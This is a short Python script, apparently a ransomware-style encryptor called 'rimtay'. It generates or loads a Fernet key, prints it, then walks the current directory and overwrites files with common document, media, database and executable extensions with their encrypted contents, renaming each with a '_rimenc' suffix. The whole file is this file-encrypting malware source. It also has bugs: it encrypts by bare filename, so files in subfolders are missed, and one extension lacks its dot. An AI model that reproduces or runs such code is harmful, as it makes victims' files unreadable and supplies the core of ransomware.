import os
import sys
from cryptography.fernet import Fernet
# Anahtar dosyası adı.
# Name of the key file
KEYFILE = "rimtay.key"

# Şifrelenecek dosya uzantıları
# File extensions that will be encrypted
ALLOWED_FILES = [".txt",".png",".jpg",".jpeg",".gif",".doc","docx",".mp4",".mp3",".pdf",".odt",".xls",".xlsx",".json",".php",".exe",".sql",".csv",".xml"]


def encrypt(filename):
	if(os.path.exists(filename)):
		file = open(filename,"rb+")
		data = file.read()
		file.seek(0)

		if(len(data) > 0):
			name,extension = os.path.splitext(filename)
			new_name = filename+"_rimenc"
			i = 0
			while os.path.exists(new_name) == True :
				i += 1
				new_name = name+"_"+str(i)+extension+"_rimenc"

			fernet = Fernet(key)
			encrypted = fernet.encrypt(data)
			change = file.write(encrypted)
			file.close()
			
			os.rename(filename,new_name)
			print("'"+filename +"' has encrypted and renamed as '"+new_name+"'")
		else :
			print("'"+filename +"' could not encrypted because it's empty")
			file.close()
	
if os.path.exists(KEYFILE) == False : 
	file = open(KEYFILE, "wb")
	key = Fernet.generate_key()
	file.write(key)
	print("Encryption Key File Not Found! The new one is created!")
else:
	file = open(KEYFILE, "rb")
	key = file.read()
	print("Encryption Key File found on the system.")
file.close()

print("Encryption Key: " + str(key))

for root, dirs, files in os.walk(".") :
	for filename in files:
		name,extension = os.path.splitext(filename)
		extension = extension.lower()
		if(extension in ALLOWED_FILES):
			encrypt(filename)
			# print(filename)